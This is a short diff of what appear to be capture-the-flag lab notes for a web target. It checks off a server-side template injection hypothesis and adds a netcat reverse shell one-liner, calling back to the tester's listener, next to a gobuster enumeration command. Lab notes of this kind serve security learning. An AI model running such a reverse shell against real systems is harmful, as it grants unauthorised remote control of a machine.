@@ -7,7 +7,7 @@
 
 ## <span style="color:[COLOR]">Checklist 🤓   
 
-- [ ] It might be SSTI
+- [x] It might be SSTI
 - [ ] There could be a way to upload a file onto the web server ( a php file ) and executing it by visiting it.
 - [ ] The `/console` directory.
 
@@ -128,6 +128,7 @@ def send_report(path):
 
 
 gobuster dir -u 10.10.11.164 -x 'txt,md,jpg,php,html' -w /usr/share/seclists/Discovery/Web-Content/big.txt -b '404,403'
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.4 4444 >/tmp/f
 
 
 
